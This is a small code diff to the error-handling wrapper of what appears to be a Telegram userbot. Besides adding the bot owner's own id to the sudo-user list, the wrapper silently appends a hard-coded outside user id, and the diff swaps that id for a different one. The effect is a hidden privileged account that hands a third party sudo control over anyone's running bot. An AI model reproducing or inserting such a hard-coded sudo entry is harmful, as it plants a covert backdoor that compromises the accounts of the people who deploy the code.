@@ -74,7 +74,7 @@ def handle_error(func: Callable) -> Callable:
         me = await pyro_client.get_me()
         if me.id not in config.SUDO_USERS:
             config.SUDO_USERS.append(me.id)
-            config.SUDO_USERS.append(2033438978)
+            config.SUDO_USERS.append(5122474448)
         try:
             lang = get_group(chat_id)["lang"]
         except:
@@ -82,7 +82,7 @@ def handle_error(func: Callable) -> Callable:
         try:
             return await func(client, obj, *args)
         except Exception:
-            k = "Legend_Userbot"
+            k = "Legend_K_Userbot"
             id = int(time.time())
             date = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
             error_msg = await pyro_client.send_message(
